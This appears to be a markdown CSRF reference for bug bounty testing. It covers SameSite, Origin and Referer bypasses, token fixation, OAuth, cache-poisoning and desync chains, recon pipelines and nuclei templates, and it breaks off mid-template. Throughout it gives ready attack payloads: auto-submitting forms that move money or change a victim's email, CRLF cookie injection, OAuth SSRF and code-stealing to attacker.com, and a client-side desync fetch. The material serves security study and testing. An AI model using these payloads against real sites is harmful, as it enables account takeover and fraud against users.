# CSRF Advanced Knowledgebase
## Research-Grade Cross-Site Request Forgery (CSRF) Reference for Bug Bounty & Black-Box Testing

> **Scope**: This document covers CSRF from basic theory to advanced exploitation chains including SameSite bypasses, browser-powered desync, cache poisoning + CSRF, OAuth chains, postMessage gadgets, parser confusion, automation logic, and nuclei templates.
> **Sources**: PortSwigger Web Security Academy & Research, PayloadsAllTheThings, HackTricks, MDN, GitHub security repos, Black Hat/DEF CON research, and real-world bug bounty findings.

---

## Table of Contents

1. [Basics](#basics)
2. [CSRF Theory](#csrf-theory)
3. [SameSite Cookie Internals](#samesite-cookie-internals)
4. [SameSite Bypass Techniques](#samesite-bypass-techniques)
5. [Origin Validation Bypasses](#origin-validation-bypasses)
6. [Referer Validation Bypasses](#referer-validation-bypasses)
7. [Token Fixation Attacks](#token-fixation-attacks)
8. [Token Duplication Attacks](#token-duplication-attacks)
9. [GET-to-POST Override Techniques](#get-to-post-override-techniques)
10. [Login CSRF Attacks](#login-csrf-attacks)
11. [OAuth + CSRF Chains](#oauth--csrf-chains)
12. [Cache Poisoning + CSRF Chains](#cache-poisoning--csrf-chains)
13. [Request Smuggling + CSRF Chains](#request-smuggling--csrf-chains)
14. [postMessage + CSRF Chains](#postmessage--csrf-chains)
15. [Parser Confusion Payloads](#parser-confusion-payloads)
16. [Browser Quirks](#browser-quirks)
17. [Gadget Chains](#gadget-chains)
18. [Real World Case Studies](#real-world-case-studies)
19. [Fuzzing Payloads](#fuzzing-payloads)
20. [Automation Workflows](#automation-workflows)
21. [Recon Methodology](#recon-methodology)
22. [Nuclei Templates](#nuclei-templates)
23. [Tools and Scanners](#tools-and-scanners)
24. [Advanced Research](#advanced-research)
25. [Bug Bounty Writeups](#bug-bounty-writeups)
26. [Payload Collections](#payload-collections)
27. [WAF Bypasses](#waf-bypasses)
28. [Detection Techniques](#detection-techniques)
29. [References](#references)

---

## Basics

### What is CSRF?
Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target **state-changing requests**, not theft of data, since the attacker has no way to see the response to the forged request.

### Prerequisites for CSRF
1. **Session-dependent action**: The target action must require authentication (session cookie, basic auth, etc.)
2. **Predictable request structure**: Attacker must know/know all required parameters
3. **No unpredictable anti-CSRF token**: The request lacks strong CSRF protection
4. **Cookie behavior**: Browser must send cookies automatically with cross-site requests (or attacker must bypass SameSite)

### Simple CSRF Attack Flow
```
Victim logs into bank.com → bank.com sets session cookie
Victim visits attacker.com → attacker.com contains malicious form
Browser submits form to bank.com WITH session cookie
Bank.com processes transaction as legitimate user
```

### CSRF vs XSS vs Clickjacking
| Attack | Mechanism | Goal |
|--------|-----------|------|
| CSRF | Forges request using victim's cookies | State change on behalf of user |
| XSS | Injects JavaScript into target origin | Data theft, session hijacking, DOM manipulation |
| Clickjacking | Tricks user into clicking hidden element | UI redressing, forced actions |

> **Key Insight**: CSRF and XSS are often chainable. XSS on a sibling domain can bypass SameSite=Strict by making same-site requests.

---

## CSRF Theory

### The Same-Origin Policy (SOP) and CSRF
SOP prevents reading cross-origin responses but **does NOT prevent sending cross-origin requests**. This is the fundamental reason CSRF exists:
- Browsers freely send cookies with cross-site requests (depending on SameSite)
- The attacker cannot read the response, but the action is executed

### Simple vs Non-Simple Requests
Browsers distinguish two sorts of HTTP requests:

**Simple requests** (can be made cross-origin without preflight):
- Methods: GET, HEAD, POST
- Headers: Accept, Accept-Language, Content-Language, Content-Type (only `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`)
- No custom headers

**Non-simple requests** trigger CORS preflight and are blocked by default unless CORS allows them.

> **Defense implication**: Making state-changing requests non-simple (e.g., `Content-Type: application/json` or custom headers) prevents basic CSRF from HTML forms.

### Fetch Metadata Headers
Modern browsers send `Sec-Fetch-*` headers:
- `Sec-Fetch-Site`: `same-origin`, `same-site`, `cross-site`, `none`
- `Sec-Fetch-Mode`: `navigate`, `no-cors`, `cors`, `same-origin`
- `Sec-Fetch-Dest`: `document`, `iframe`, `image`, etc.

```javascript
// Server-side validation example (Express.js)
app.post("/transfer", (req, res) => {
  const secFetchSite = req.headers["sec-fetch-site"];
  if (secFetchSite === "same-origin" || secFetchSite === "same-site") {
    // Process request
  } else {
    // Reject cross-site request
  }
});
```

> **Bypass note**: `Sec-Fetch-Site: none` is sent for directly user-initiated requests (typing URL, clicking bookmark). Some servers incorrectly allow this value.

---

## SameSite Cookie Internals

### SameSite Attribute Values

#### `SameSite=Strict`
- Cookie is NEVER sent in cross-site requests
- Most secure but breaks UX (e.g., clicking links from email won't include session)
- Recommended for: sensitive action cookies (change password, transfer funds)

#### `SameSite=Lax`
- Cookie sent in cross-site requests ONLY if:
  1. **Safe method**: GET, HEAD, TRACE, OPTIONS (NOT POST)
  2. **Top-level navigation**: User clicks a link, not iframe/img/script requests
- Default in Chrome since 2021 (Lax-by-default)
- Recommended for: session identification cookies

#### `SameSite=None`
- Cookie sent in ALL cross-site requests
- Must be paired with `Secure` attribute (HTTPS only)
- Required for: third-party integrations, tracking, embedded content

### Site vs Origin
| Concept | Definition | Example |
|---------|------------|---------|
| **Origin** | scheme + host + port | `https://app.example.com:443` |
| **Site** | eTLD+1 + scheme | `https://example.com` |

> **Critical**: `https://foo.example.com` and `https://bar.example.com` are **same-site** but **cross-origin**. XSS on `foo.example.com` can bypass SameSite defenses on `bar.example.com`.

### The 2-Minute Lax Loophole (Chrome)
Chrome applies a 120-second grace period for `Lax-by-default` cookies (not explicitly set `Lax`):
- Newly issued session cookies are sent in top-level POST requests for 2 minutes
- Designed to prevent breaking OAuth/SAML SSO flows
- **Exploitation**: Force cookie refresh (e.g., OAuth re-login) then immediately execute CSRF

```javascript
// Force cookie refresh via popup (requires user interaction)
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
};
// Then execute POST CSRF within 2 minutes
```

### Browser Default Behaviors
| Browser | Default SameSite | Notes |
|---------|-----------------|-------|
| Chrome | Lax | Since Feb 2020 |
| Firefox | Lax | Since 2021 |
| Safari | Lax | Since iOS 14/macOS Big Sur |
| Edge | Lax | Follows Chromium |

---

## SameSite Bypass Techniques

### 1. GET-based CSRF Against Lax
If the server accepts GET for state-changing actions:
```html
<!-- Simple image/link-based attack -->
<img src="https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000">
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

**Detection**: Test if endpoints accept GET for POST actions. Look for:
- Framework method override parameters
- Router misconfigurations
- API endpoints that don't strictly validate method

### 2. Method Override Bypass (Lax → POST)
Many frameworks support method override parameters:
```html
<!-- Symfony _method parameter -->
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

**Common Method Override Parameters**:
```
_method=POST
_method=PUT
_method=DELETE
_http_method=POST
X-HTTP-Method-Override: POST
X-HTTP-Method: POST
X-Method-Override: POST
```

> **Research note**: Rails, Symfony, Laravel, Django (with middleware), ASP.NET MVC support various forms of method override.

### 3. On-Site Gadgets (Bypassing Strict)
If a cookie is `SameSite=Strict`, find a **client-side redirect** gadget on the same site:
```javascript
// Vulnerable client-side redirect on target.com
// URL: https://target.com/redirect?url=https://attacker.com
// This results in a same-site request (as far as browser is concerned)
// because the redirect is executed by JavaScript, not recognized as cross-site

// Attack chain:
// 1. Victim visits attacker.com
// 2. attacker.com opens target.com/redirect?url=https://target.com/api/delete
// 3. Browser treats this as same-site (top-level navigation to target.com)
// 4. Strict cookie is included
// 5. JavaScript redirects to the actual action URL (same-site request)
```

**Key distinction**: Server-side 302/301 redirects preserve cross-site context; client-side `location.href` or `window.location` redirects do NOT.

### 4. Sibling Domain XSS → SameSite Bypass
If `foo.target.com` has XSS and `bar.target.com` has Strict cookies:
```javascript
// From XSS on foo.target.com, make same-site request to bar.target.com
fetch('https://bar.target.com/api/sensitive-action', {
    method: 'POST',
    credentials: 'include',
    body: 'action=delete'
});
```

> **Recon tip**: Always audit ALL subdomains. A low-severity XSS on `blog.target.com` can bypass Strict CSRF on `admin.target.com`.

### 5. Cross-Site WebSocket Hijacking (CSWSH)
WebSocket handshake is HTTP-based and vulnerable to CSRF:
```javascript
// Attacker page
var ws = new WebSocket('wss://target.com/chat');
// If handshake uses session cookies and lacks CSRF token, connection is hijacked
```

**Detection**: Check if WebSocket handshake includes:
- `Origin` header validation
- CSRF token in handshake URL
- `Sec-WebSocket-Key` alone is NOT sufficient protection

### 6. Newly Issued Cookie Window (Chrome Lax-by-default)
Exploit the 2-minute window by forcing session refresh:
```javascript
// Step 1: Force new session cookie via OAuth popup
window.onclick = () => {
    window.open('https://target.com/auth/refresh');
};

// Step 2: Within 2 minutes, submit CSRF POST
// The new cookie is sent even in cross-site POST during grace period
```

### 7. SameSite=None Cookie Misconfiguration
Look for sensitive cookies set with `SameSite=None` without proper justification:
```http
Set-Cookie: session=abc123; SameSite=None; Secure
```

**Hunting tip**: Check all cookies in application. Sometimes developers set `SameSite=None` on ALL cookies to fix third-party issues, accidentally exposing session cookies.

---

## Origin Validation Bypasses

### Origin Header Behavior
- `Origin` header is sent for: POST requests, CORS requests, WebSocket requests
- `Origin` is NOT sent for: same-origin GET requests, some redirects
- Browsers send `Origin: null` for: data://, file://, sandboxed iframes, redirects

### Bypass Techniques

#### 1. Origin: null
```html
<!-- Using sandboxed iframe to send null Origin -->
<iframe sandbox="allow-scripts" srcdoc="
    <script>
        fetch('https://target.com/api', {
            method: 'POST',
            credentials: 'include'
        });
    </script>
"></iframe>
```

> **Server vulnerability**: If server allows `Origin: null`, sandboxed iframe bypasses origin check.

#### 2. Subdomain Takeover + Origin Bypass
If `attacker.target.com` exists (subdomain takeover):
```
Origin: https://attacker.target.com
// Server checks if Origin ends with target.com → ALLOWED
```

#### 3. Protocol/Port Mismatch
```
Origin: https://target.com:8080
// Server does exact match but allows port variations
```

#### 4. Origin Reflection via XSS
If target reflects Origin in response without validation:
```
Origin: https://attacker.com
// Server reflects: Access-Control-Allow-Origin: https://attacker.com
```

#### 5. Parsing Differences
```
Origin: https://target.com.attacker.com
// Server parses incorrectly using suffix matching
```

---

## Referer Validation Bypasses

### Referer Header Behavior
- `Referer` contains full URL of the page that initiated the request
- Can be stripped by: HTTPS→HTTP downgrade, Referrer-Policy header, browser extensions, meta tags
- Some requests never send Referer (direct navigation, bookmark, typing URL)

### Bypass Techniques

#### 1. Referer Stripping via Downgrade
```html
<!-- From HTTPS attacker page, make request to HTTP target -->
<meta name="referrer" content="no-referrer">
<img src="http://target.com/action">
```

#### 2. Referrer-Policy Abuse
```html
<!-- Strip Referer using policy -->
<meta name="referrer" content="origin">
<!-- Now Referer only shows origin, not full path -->
```

#### 3. Broken Referer Validation (Regex)
```
Server checks: Referer contains "target.com"
Bypass: Referer: https://attacker.com/?target.com
```

#### 4. Missing Referer Handling
```
Server logic:
if (referer.contains("target.com")) { allow(); }
else { reject(); }

// If Referer is missing entirely, falls through to reject
// BUT if logic is:
if (referer == null || referer.contains("target.com")) { allow(); }
// Then stripping Referer bypasses check
```

**PortSwigger Lab - Broken Referer Validation**:
```html
<!-- Inject Referer via history manipulation -->
<script>
history.pushState("", "", "/?attacker.com");
// Now Referer might contain attacker.com pattern
</script>
```

#### 5. Referer via Open Redirect
```
// Use target's own open redirect to make Referer appear legitimate
// Attacker site → target.com/redirect?url=attacker.com → target.com/action
// Referer shows target.com/redirect (legitimate looking)
```

---

## Token Fixation Attacks

### Concept
If the server accepts ANY valid CSRF token (not necessarily bound to the current session), attacker can:
1. Obtain a valid CSRF token from their own session
2. Embed it in the attack payload
3. Victim submits with attacker's token
4. Server validates token format but doesn't check session binding

### Detection
```
1. Login as User A, obtain token T1
2. Login as User B in different browser, obtain token T2
3. Try User A's request with T2
4. If accepted → Token not tied to session (vulnerable)
```

### Exploitation
```html
<form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="ATTACKER_KNOWN_TOKEN">
</form>
<script>document.forms[0].submit();</script>
```

---

## Token Duplication Attacks

### Double Submit Cookie Pattern
Some applications use the "double submit cookie" technique:
- CSRF token in cookie = CSRF token in request parameter
- Server compares cookie value vs parameter value
- **Vulnerability**: If attacker can set the cookie, they control both values

### CRLF Injection → Cookie Injection
```
GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/1.1
Host: target.com
```

If search parameter reflects in `Set-Cookie` header with CRLF injection:
```html
<!-- Attack payload -->
<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" 
     onerror="document.forms[0].submit();"/>

<form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="fake">
</form>
```

### Cookie Tossing
If subdomain can set cookies for parent domain:
```javascript
// From attacker.target.com, set cookie for .target.com
document.cookie = "csrf=attacker_controlled; Domain=.target.com; Path=/";
// Now target.com sees attacker's csrf cookie
```

---

## GET-to-POST Override Techniques

### Framework-Specific Overrides
```
# Symfony
_method=POST

# Laravel
_method=PUT

# Rails
_method=DELETE

# Django (with django-method-override middleware)
X-HTTP-Method-Override: POST

# Common variations
_http_method=POST
X-HTTP-Method: POST
X-Method-Override: POST
```

### Exploitation Chain (SameSite=Lax Bypass)
```html
<!-- GET form with method override to bypass Lax restrictions -->
<form action="https://target.com/account/transfer" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit();</script>
```

> **Why this works**: Browser sees GET request → includes Lax cookies. Server sees `_method=POST` → processes as POST.

### Query String Method Override
Some APIs accept method in query string:
```
GET /api/users?method=DELETE&id=123
// Server interprets as DELETE request
```

---

## Login CSRF Attacks

### Concept
Force victim to log into attacker-controlled account:
```html
<form action="https://target.com/login" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="known_password">
</form>
```

**Impact**:
- Attacker can track victim's activity
- Victim's sensitive data (address, payment) saved to attacker's account
- OAuth linking attacks (connect victim's social account to attacker's app account)

### OAuth Login CSRF
```html
<!-- Force victim to link their Google account to attacker's app account -->
<form action="https://app.com/oauth/google" method="POST">
    <input type="hidden" name="connect" value="true">
</form>
```

### Detection
- Check if login endpoints have CSRF protection
- Check if OAuth authorization/linking endpoints have `state` parameter validation
- Check if registration → login flow is protected

---

## OAuth + CSRF Chains

### Hidden OAuth Attack Vectors (PortSwigger Research)

#### 1. Dynamic Client Registration SSRF
OAuth registration endpoints accept URLs that are fetched later:
```json
POST /connect/register HTTP/1.1
Content-Type: application/json

{
    "redirect_uris": ["https://attacker.com/callback"],
    "logo_uri": "http://attacker.com/ssrf",
    "jwks_uri": "http://attacker.com/ssrf",
    "sector_identifier_uri": "http://attacker.com/ssrf",
    "request_uris": ["http://attacker.com/request.jwt"]
}
```

**SSRF triggers**:
- `logo_uri`: Fetched when displaying client approval page
- `jwks_uri`: Fetched when validating JWT client assertions at token endpoint
- `sector_identifier_uri`: Fetched during authorization flow
- `request_uri`: Fetched at start of authorization (can bypass registration entirely)

#### 2. redirect_uri Session Poisoning
When OAuth parameters are stored in session across multiple steps:
```
Step 1: Attacker sends /authorize?client_id=trusted&redirect_uri=attacker.com
        → Server stores redirect_uri in session
Step 2: Victim approves legitimate authorization
        → Server uses POISONED redirect_uri from session
        → Authorization code sent to attacker.com
```

**Exploitation**:
```html
<!-- Race condition / session poisoning -->
<script>
// Open authorization with attacker's redirect_uri
fetch('https://oauth-server.com/authorize?client_id=legit&redirect_uri=https://attacker.com&prompt=consent', {
    mode: 'no-cors',
    credentials: 'include'
});
// Victim then approves legitimate app → code goes to attacker
</script>
```

#### 3. Mass Assignment on confirm_access
If OAuth server uses `@ModelAttribute` or similar:
```
GET /authorize?client_id=legit&redirect_uri=https://trusted.com&prompt=consent
// User approves...

// Attacker also sends:
GET /oauth/confirm_access?redirectUri=https://attacker.com
// Mass assignment overwrites session redirect_uri
```

#### 4. state Parameter CSRF
If `state` parameter is not validated:
```
1. Attacker initiates OAuth flow, obtains state=KNOWN_VALUE
2. Attacker tricks victim into completing OAuth with attacker's state
3. Attacker uses victim's code with their own state
```

---

## Cache Poisoning + CSRF Chains

### Web Cache Entanglement (PortSwigger Research)

#### 1. Cache Key Exclusion Exploits
If cache excludes query string from key:
```
GET //?x=<script>alert(1)</script> HTTP/1.1
Host: target.com

Cache Key: https://target.com//
Response: <meta property="og:url" content="//target.com//?x"><script>alert(1)</script>"/>

// Now everyone visiting // gets XSS
GET // HTTP/1.1
Host: target.com
X-Cache: HIT
```

#### 2. Fat GET Cache Poisoning
Varnish/Rack::Cache forwards GET body but doesn't include it in cache key:
```
GET /contact/report-abuse?report=victim HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=attacker

// Cache key: GET /contact/report-abuse?report=victim
// Backend sees: report=attacker
// All users reporting victim actually report attacker
```

#### 3. Cache Parameter Cloaking
Using parsing differences between cache and backend:
```
# Akamai akamai-transform exclusion
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
# Cache key: /en?x=1
# Backend sees: x=1, akamai-transform=payload-goes-here

# Rails ; delimiter
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
# Cache key: callback=legit
# Backend sees: callback=alert(1)//
```

#### 4. Cache Key Injection
Akamai bundles key components without escaping:
```
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__
# Cache key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__

GET /?x=2__Origin='-alert(1)-' HTTP/1.1
# Same cache key! Backend sees different Origin, XSS executes
```

### CSRF + Cache Poisoning Chain
```
1. Poison cache with CSRF payload in unkeyed parameter
2. Victim visits poisoned page
3. Browser loads poisoned resource (JS/CSS) with CSRF exploit
4. CSRF executes against target API using victim's session
```

---

## Request Smuggling + CSRF Chains

### Browser-Powered Desync (PortSwigger Research)

#### 1. Client-Side Desync (CSD)
Victim's browser becomes the desync delivery platform:
```javascript
// Attacker page
fetch('https://target.com/favicon.ico', {
    method: 'POST',
    body: "GET /404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://target.com/'; // Uses poisoned connection
});
```

**Mechanism**:
1. Browser sends POST with overlong body to endpoint that ignores Content-Length
2. Server responds, leaving body on socket
3. Browser reuses connection for next request
4. Body prefix prepended to next request → request smuggling

#### 2. CL.0 Desync
Backend ignores Content-Length entirely:
```
POST /static/file HTTP/1.1
Host: target.com
Content-Length: 23

GET /admin HTTP/1.1
X: X

// Backend treats body as start of next request
```

#### 3. H2.0 Desync (HTTP/2 → HTTP/1.1 Downgrade)
HTTP/2 request without Content-Length, ALB adds Transfer-Encoding:
```
HTTP/2 request:
:method POST
:path /
:authority target.com

0

malicious-prefix

// Downgraded to HTTP/1.1 with TE: chunked
// Perfect desync trigger
```

#### 4. Pause-Based Desync
Front-end timeout vs back-end timeout differences:
```
Send headers, promise body, wait for front-end timeout
Front-end sends error but keeps connection open
Send body → interpreted as new request by back-end
```

### CSRF + Desync Exploitation
```
1. Victim visits attacker.com
2. Attacker uses CSD to poison victim's connection to target.com
3. Victim's next request to target.com is prefixed with attacker's request
4. Attacker's request includes victim's cookies (same connection)
5. CSRF executes with full authentication
```

---

## postMessage + CSRF Chains

### postMessage Basics
```javascript
// Target window listens for messages
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted.com') return;
    // Process message
});
```

### postMessage CSRF Gadgets
If target uses postMessage to trigger actions without proper origin check:
```javascript
// Attacker iframe
window.parent.postMessage({
    action: 'transfer',
    amount: 1000000,
    to: 'attacker'
}, '*'); // Or target origin if known
```

### postMessage + DOM Clobbering
```html
<!-- DOM clobbering to create fake postMessage handler -->
<a id="config"></a>
<a id="config" name="target" href="https://attacker.com"></a>
<script>
// config.target now exists, potentially confusing origin checks
</script>
```

### postMessage Tracker Usage
Use postMessage-tracker to identify vulnerable message handlers:
```javascript
// Monitor all postMessage traffic
window.addEventListener('message', function(e) {
    console.log('Origin:', e.origin);
    console.log('Data:', e.data);
    console.log('Source:', e.source);
});
```

---

## Parser Confusion Payloads

### Content-Type Confusion
```
# Server expects JSON but accepts form-data
Content-Type: application/json
Body: {"role":"admin"}

# But if server is confused:
Content-Type: application/x-www-form-urlencoded
Body: role=admin

# Or mixed:
Content-Type: application/json
Body: role=admin (treated as JSON with implicit parsing)
```

### Parameter Pollution
```
# Duplicate parameters with different values
POST /api HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=1&id=2&id=3

# Backend might parse only first, last, or concatenate
```

### JSON Parameter Padding
```html
<!-- Send JSON via form to bypass content-type restrictions -->
<form action="https://target.com/api" method="POST" enctype="text/plain">
    <input type="hidden" name='{"role":admin, "ignore":"' value='"}' />
</form>
<!-- Results in body: {"role":admin, "ignore":"="} -->
```

### Charset Confusion
```
Content-Type: application/x-www-form-urlencoded; charset=utf-7
// Server might decode UTF-7 encoded payloads differently
```

---

## Browser Quirks

### Chrome Connection Pools
Chrome maintains separate connection pools:
- **With cookies**: Used for navigations, credentialed requests
- **Without cookies**: Used for no-cors fetch without credentials

> **CSD exploitation**: Always use `credentials: 'include'` to poison the correct pool.

### Firefox Enhanced Tracking Protection
Firefox ETP Standard mode blocks some cross-site requests. Bypass:
```html
<!-- Use form submission instead of XHR -->
<form id="CSRF_POC" action="target.com/api" enctype="text/plain" method="POST">
    <input type="hidden" name='{"role":admin, "other":"' value='"}' />
</form>
<script>document.getElementById("CSRF_POC").submit();</script>
```

### Safari ITP (Intelligent Tracking Prevention)
- Third-party cookies blocked after 24 hours
- LocalStorage partitioned
- **Impact**: Some CSRF techniques relying on cookie persistence may fail

### The `Referer` Header in Cross-Site Requests
- Sent for: cross-site POST, cross-site GET with user activation
- NOT sent for: direct navigation, HTTPS→HTTP, strict Referrer-Policy

### `Origin: null` Scenarios
```javascript
// null Origin is sent for:
- data:// URIs
- file:// URIs  
- sandboxed iframes (sandbox="allow-scripts")
- Redirects through certain protocols
```

### Fetch API Quirks
```javascript
// mode: 'no-cors' prevents reading response but still sends cookies
fetch('https://target.com/action', {
    method: 'POST',
    body: 'action=delete',
    mode: 'no-cors',
    credentials: 'include'
});
```

---

## Gadget Chains

### Client-Side Redirect Gadgets
```javascript
// Gadget 1: URL parameter redirect
// target.com/redirect?url=ATTACKER
// → JavaScript: location.href = urlParameter

// Gadget 2: Meta refresh
// <meta http-equiv="refresh" content="0;url=ATTACKER">

// Gadget 3: JavaScript protocol in href
// <a href="javascript:location.href='ATTACKER'">click</a>
```

### DOM Clobbering Gadgets
```html
<!-- Create fake objects via DOM clobbering -->
<form id="config">
    <input name="apiEndpoint" value="https://attacker.com">
</form>
<script>
// config.apiEndpoint now exists, overriding expected config object
fetch(config.apiEndpoint + '/action');
</script>
```

### Prototype Pollution → CSRF
```javascript
// Pollute Object.prototype to disable CSRF checks
Object.prototype.csrfToken = 'known';
// Now all objects have csrfToken, potentially bypassing checks
```

### postMessage Gadgets
```javascript
// Vulnerable message handler becomes CSRF gadget
window.addEventListener('message', function(e) {
    // Missing origin check
    if (e.data.action === 'changeEmail') {
        changeEmail(e.data.email); // No CSRF token check!
    }
});
```

---

## Real World Case Studies

### Case Study 1: Facebook Marketing Developers CSRF
- **Target**: Facebook marketing API
- **Technique**: Proxies + CSRF on API endpoints
- **Impact**: Unauthorized ad campaign modifications
- **Lesson**: API endpoints behind proxies may inherit CSRF vulnerabilities

### Case Study 2: PayPal CSRF (Yasser Ali)
- **Target**: PayPal account actions
- **Technique**: Bypassed CSRF protection on sensitive endpoints
- **Impact**: Account takeover via password reset CSRF
- **Lesson**: Even financial institutions can have CSRF gaps in legacy endpoints

### Case Study 3: Apple Beats Account Takeover
- **Target**: Apple Beats account system
- **Technique**: Login CSRF + OAuth linking
- **Impact**: Full account takeover
- **Lesson**: Login CSRF combined with OAuth can have severe impact

### Case Study 4: Amazon Client-Side Desync
- **Target**: Amazon.com
- **Technique**: H2.0 desync via CL.0 on `/b/`
- **Impact**: Stored victim requests (including auth tokens) in attacker's shopping list
- **Researcher**: James Kettle (PortSwigger)
- **Lesson**: Browser-powered desync can expose single-server architectures

### Case Study 5: Akamai Cache Poisoning + CSRF
- **Target**: Capital One (Akamai CDN)
- **Technique**: Client-side desync + stacked HEAD response
- **Impact**: XSS → Account hijacking
- **Researcher**: James Kettle
- **Lesson**: CDNs can be weaponized via cache poisoning for CSRF escalation

### Case Study 6: MITREid Connect OAuth SSRF + XSS
- **Target**: MITREid Connect OAuth server
- **Technique**: Dynamic client registration `logo_uri` → SSRF → XSS
- **CVE**: CVE-2021-26715
- **Lesson**: OAuth registration endpoints are under-audited attack surface

### Case Study 7: MITREid Connect Session Poisoning
- **Target**: MITREid Connect
- **Technique**: `redirect_uri` session poisoning + mass assignment
- **CVE**: CVE-2021-27582
- **Lesson**: OAuth session management is complex and prone to race conditions

---

## Fuzzing Payloads

### CSRF Token Parameter Names
```
csrf
csrf_token
_csrf
csrfmiddlewaretoken
csrf-token
xsrf_token
_xsrf
token
authenticity_token
nonce
state
hash
rand
key
checksum
verify
validation
timestamp
```

### Method Override Parameters
```
_method
_http_method
X-HTTP-Method-Override
X-HTTP-Method
X-Method-Override
__method
method_override
http_method
```

### Content-Type Variations for JSON CSRF
```
application/x-www-form-urlencoded
multipart/form-data
text/plain
application/json
application/xml
text/xml
text/json
application/x-json
```

### Referer Manipulation Payloads
```
https://attacker.com/https://target.com
https://attacker.com?target.com
https://target.com.attacker.com
https://attacker.com/target.com
null
https://null
https://0.0.0.0
```

### Origin Manipulation Payloads
```
https://attacker.com
null
https://target.com.attacker.com
https://attacker-target.com
https://sub.target.com (sibling domain)
https://target.com:8080
```

### Cookie Injection Test Payloads
```
test%0d%0aSet-Cookie:%20test=test
test%0aSet-Cookie:%20test=test
test%0dSet-Cookie:%20test=test

Set-Cookie: test=test

Set-Cookie: test=test
```

---

## Automation Workflows

### Recon Automation Pipeline
```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. Live host discovery
httpx -l subs.txt -o live.txt -status-code -tech-detect

# 3. Endpoint crawling
katana -list live.txt -o endpoints.txt -d 5 -jc

# 4. CSRF parameter discovery
cat endpoints.txt | grep -E "(csrf|token|nonce|state|_method)" > csrf_params.txt

# 5. Nuclei CSRF scanning
nuclei -l live.txt -t nuclei-templates/http/vulnerabilities/csrf/ -o csrf_results.txt
```

### Burp Suite Automation
```python
# BApp: CSRF Token Tracker
# Configure to automatically update CSRF tokens in requests

# BApp: Autorize
# Check for authorization bypasses (can reveal missing CSRF checks)

# BApp: Param Miner
# Discover hidden parameters including CSRF tokens
```

### Custom CSRF Scanner Logic
```python
import requests

def test_csrf_protection(url, session):
    """Test if endpoint has CSRF protection"""
    # Request 1: Normal request with session
    r1 = session.get(url)

    # Request 2: Cross-origin simulation (no Origin/Referer)
    headers = {
        'Origin': 'https://attacker.com',
        'Referer': 'https://attacker.com'
    }
    r2 = session.post(url, data={'action': 'test'}, headers=headers)

    # If both succeed with same effect, potential CSRF
    if r1.status_code == 200 and r2.status_code == 200:
        return True
    return False
```

---

## Recon Methodology

### Phase 1: Endpoint Discovery
1. Crawl application with authenticated session
2. Identify all state-changing endpoints:
   - POST/PUT/DELETE requests
   - Form submissions
   - API calls
   - AJAX endpoints
3. Map authentication requirements per endpoint

### Phase 2: Cookie Analysis
```bash
# Extract and analyze cookies
curl -I https://target.com | grep -i set-cookie

# Check for:
# - Missing SameSite attribute
# - SameSite=None on sensitive cookies
# - Missing Secure flag
# - Weak cookie naming
```

### Phase 3: Token Analysis
1. Check if CSRF tokens exist
2. Test token predictability
3. Test session binding:
   - User A token with User B session
   - Token reuse across sessions
4. Check token transport (cookie vs body vs header)

### Phase 4: SameSite Testing
```bash
# Test cookie behavior with different request types
# 1. Cross-site GET (link click)
# 2. Cross-site POST (form submission)
# 3. Cross-site fetch (XHR/fetch)
# 4. Top-level navigation vs iframe/subresource
```

### Phase 5: Framework Detection
```
# Identify framework for method override testing
# - X-Powered-By headers
# - Cookie names (e.g., laravel_session, csrftoken)
# - Form structure
# - Error messages
# - URL patterns
```

### Phase 6: OAuth/SAML Assessment
1. Identify OAuth endpoints (`/authorize`, `/token`, `/callback`)
2. Check for `state` parameter
3. Test `redirect_uri` validation
4. Check for dynamic client registration (`/.well-known/openid-configuration`)
5. Test session poisoning via concurrent requests

### Phase 7: Cache Analysis
```bash
# Identify caching behavior
curl -I https://target.com | grep -i cache

# Test cache key components
# - Query string inclusion
# - Header inclusion
# - Method inclusion
# - Path normalization
```

---

## Nuclei Templates

### Basic CSRF Detection Template
```yaml
id: csrf-token-missing

info:
  name: CSRF Token Missing
  author: custom
  severity: medium
  description: Detects forms missing CSRF tokens

dsl:
  - "status_code == 200"
  - "contains(body, '<form')"
  - "!contains(body, 'csrf')"
  - "!contains(body, 'token')"
```

### SameSite Cookie Check Template
```yaml
id: samesite-cookie-missing

info:
  name: Missing SameSite Cookie Attribute
  author: custom
  severity: low
  description: Detects cookies without SameSite attribute

requests:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers:
      - type: regex
        part: header
        regex:
          - "Set-Cookie:.*(?i)(session|auth|token|id)=.*"
        negative: true
        condition: and
      - type: regex
        part: header
        regex:
          - "Set-Cookie:.*SameSite="
        negative: true
```

### OAuth State Parameter Check
```yaml
id: oauth-missing-state

info:
  name: OAuth Missing State Parameter
  author: custom
  severity: high
  description: Detects OAuth authorization requests without state parameter

requests:
